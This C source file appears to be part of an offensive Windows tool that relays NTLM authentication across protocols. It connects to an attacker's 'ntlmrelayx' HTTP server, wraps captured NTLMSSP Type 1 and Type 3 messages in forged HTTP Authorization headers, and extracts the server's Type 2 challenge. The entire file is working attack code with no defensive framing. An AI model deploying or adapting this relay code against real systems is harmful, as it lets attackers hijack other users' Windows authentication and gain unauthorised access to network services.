#define WIN32_LEAN_AND_MEAN

#include "Windows.h"
#include "stdio.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <wincrypt.h>
#include "HTTPCrossProtocolRelay.h"


#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Crypt32.lib")

#pragma warning(disable : 4996) //_CRT_SECURE_NO_WARNINGS



extern void DumpHex(const void* data, size_t size);
extern int findNTLMBytes(char* bytes, int len);
SOCKET CreateHTTPSocket(wchar_t*, wchar_t*);

SOCKET CreateHTTPSocket(const wchar_t* remoteHTTPIp, const wchar_t* remoteHttpPort) {
	//----------------------
	// Initialize Winsock

	char remoteHTTPIp_a[20];
	char remotePort_a[12];
	int remotePort;
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != NO_ERROR) {
		wprintf(L"WSAStartup function failed with error: %d\n", iResult);
		return 1;
	}
	//----------------------
	// Create a SOCKET for connecting to server
	SOCKET ConnectSocket;
	ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (ConnectSocket == INVALID_SOCKET) {
		wprintf(L"socket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}
	//----------------------
	// The sockaddr_in structure specifies the address family,
	// IP address, and port of the server to be connected to.

	memset(remotePort_a, 0, 12);
	wcstombs(remotePort_a, remoteHttpPort, 12);
	memset(remoteHTTPIp_a, 0, 20);
	wcstombs(remoteHTTPIp_a, remoteHTTPIp, 20);
	remotePort = atoi(remotePort_a);
	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	clientService.sin_addr.s_addr = inet_addr(remoteHTTPIp_a);
	clientService.sin_port = htons(remotePort);

	//----------------------
	// Connect to server.
	iResult = connect(ConnectSocket, (SOCKADDR*)& clientService, sizeof(clientService));
	if (iResult == SOCKET_ERROR) {
		wprintf(L"CreateHTTPSocket: connect function failed with error: %ld\n", WSAGetLastError());
		iResult = closesocket(ConnectSocket);
		if (iResult == SOCKET_ERROR)
			wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	printf("[*] Connected to ntlmrelayx HTTP Server %S on port %S\n", remoteHTTPIp, remoteHttpPort);
	return ConnectSocket;
}

SOCKET CreateRPCSocket(const wchar_t* remoteHTTPIp, const wchar_t* remoteHttpPort) {
	//----------------------
	// Initialize Winsock

	char remoteHTTPIp_a[20];
	char remotePort_a[12];
	int remotePort;
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != NO_ERROR) {
		wprintf(L"WSAStartup function failed with error: %d\n", iResult);
		return 1;
	}
	//----------------------
	// Create a SOCKET for connecting to server
	SOCKET ConnectSocket;
	ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (ConnectSocket == INVALID_SOCKET) {
		wprintf(L"socket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}
	//----------------------
	// The sockaddr_in structure specifies the address family,
	// IP address, and port of the server to be connected to.

	memset(remotePort_a, 0, 12);
	wcstombs(remotePort_a, remoteHttpPort, 12);
	memset(remoteHTTPIp_a, 0, 20);
	wcstombs(remoteHTTPIp_a, remoteHTTPIp, 20);
	remotePort = atoi(remotePort_a);
	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	clientService.sin_addr.s_addr = inet_addr(remoteHTTPIp_a);
	clientService.sin_port = htons(remotePort);

	//----------------------
	// Connect to server.
	iResult = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
	if (iResult == SOCKET_ERROR) {
		wprintf(L"CreateHTTPSocket: connect function failed with error: %ld\n", WSAGetLastError());
		iResult = closesocket(ConnectSocket);
		if (iResult == SOCKET_ERROR)
			wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	printf("[*] Connected to ntlmrelayx HTTP Server %S on port %S\n", remoteHTTPIp, remoteHttpPort);
	return ConnectSocket;
}

char* ForgeHTTPRequestType1(char* ntlmsspType1, int ntlmsspType1Len, int* httpPacketType1Len, wchar_t* httpIp) {
	char httpPacketTemplate[] = "GET / HTTP/1.1\r\nHost: %s\r\nAuthorization: NTLM %s\r\n\r\n";
	char* httpPacket = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DEFAULT_BUFLEN);
	int b64ntlmLen;
	char httpIp_a[20];
	memset(httpIp_a, 0, 20);
	wcstombs(httpIp_a, httpIp, 20);
	char* b64ntlmTmp = base64Encode(ntlmsspType1, ntlmsspType1Len, &b64ntlmLen);
	char b64ntlm[DEFAULT_BUFLEN];
	memset(b64ntlm, 0, DEFAULT_BUFLEN);
	memcpy(b64ntlm, b64ntlmTmp, b64ntlmLen);
	*httpPacketType1Len = sprintf(httpPacket, httpPacketTemplate, httpIp_a, b64ntlm);
	return httpPacket;
}

char* ForgeHTTPRequestType3(char* ntlmsspType3, int ntlmsspType3Len, int* httpPacketType3Len, wchar_t* httpIp) {
	char httpPacketTemplate[] = "GET / HTTP/1.1\r\nHost: %s\r\nAuthorization: NTLM %s\r\n\r\n";
	char* httpPacket = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DEFAULT_BUFLEN);
	int b64ntlmLen;
	char httpIp_a[20];
	memset(httpIp_a, 0, 20);
	wcstombs(httpIp_a, httpIp, 20);
	char* b64ntlmTmp = base64Encode(ntlmsspType3, ntlmsspType3Len, &b64ntlmLen);
	char b64ntlm[DEFAULT_BUFLEN];
	memset(b64ntlm, 0, DEFAULT_BUFLEN);
	memcpy(b64ntlm, b64ntlmTmp, b64ntlmLen);
	*httpPacketType3Len = sprintf(httpPacket, httpPacketTemplate, httpIp_a, b64ntlm);
	return httpPacket;
}

void ExtractType2FromHttp(char* httpPacket, int httpPacketLen, char* ntlmType2, int* ntlmType2Len) {
	char b64Type2[DEFAULT_BUFLEN];
	int b64Type2Len = 0;
	findBase64NTLM(httpPacket, httpPacketLen, b64Type2, &b64Type2Len);
	
	char* decodedType2Tmp = base64Decode(b64Type2, b64Type2Len, ntlmType2Len);
	
	memset(ntlmType2, 0, DEFAULT_BUFLEN);
	memcpy(ntlmType2, decodedType2Tmp, *ntlmType2Len);
	
}


int findBase64NTLM(char* buffer, int buffer_len, char* outbuffer, int* outbuffer_len) {
	char pattern_head[] = { 'N', 'T', 'L', 'M', ' ' };
	char pattern_tail[2] = { 0x0D, 0x0A }; // \r\n
	int index_start = 0;
	for (int i = 0; i < buffer_len; i++) {
	}
	for (int i = 0; i < buffer_len; i++) {
		if (buffer[i] == pattern_head[index_start]) {
			index_start = index_start + 1;
			if (index_start == sizeof(pattern_head)) {
				index_start = i + 1;
				break;
			}
		}
	}
	*outbuffer_len = 0;
	for (int i = index_start; i < buffer_len; i++) {
		if (buffer[i] == pattern_tail[0] && buffer[i + 1] == pattern_tail[1]) {
			break;
		}
		outbuffer[(*outbuffer_len)] = buffer[i];
		*outbuffer_len = (*outbuffer_len) + 1;
	}
	//printf("*outbuffer_len: %d and index_start: %d", *outbuffer_len,index_start);
	//hexDump2(NULL, outbuffer, *outbuffer_len);
	
	return 0;
}

char* base64Encode(char* text, int textLen, int* b64Len) {
	*b64Len = DEFAULT_BUFLEN;
	char* b64Text = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *b64Len);
	if (!CryptBinaryToStringA((const BYTE*)text, textLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64Text, (DWORD*)b64Len)) {
		printf("CryptBinaryToStringA failed with error code %d", GetLastError());
		HeapFree(GetProcessHeap(), 0, b64Text);
		b64Text = NULL;
		exit(-1);
	}
	return b64Text;
}

char* base64Decode(char* b64Text, int b64TextLen, int* bufferLen) {
	*bufferLen = DEFAULT_BUFLEN;
	char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *bufferLen);

	if (!CryptStringToBinaryA((LPCSTR)b64Text, b64TextLen, CRYPT_STRING_BASE64, (BYTE*)buffer, (DWORD*)bufferLen, NULL, NULL)) {
		printf("CryptStringToBinaryA failed with error code %d", GetLastError());
		HeapFree(GetProcessHeap(), 0, buffer);
		buffer = NULL;
		exit(-1);
	}
	return buffer;
}
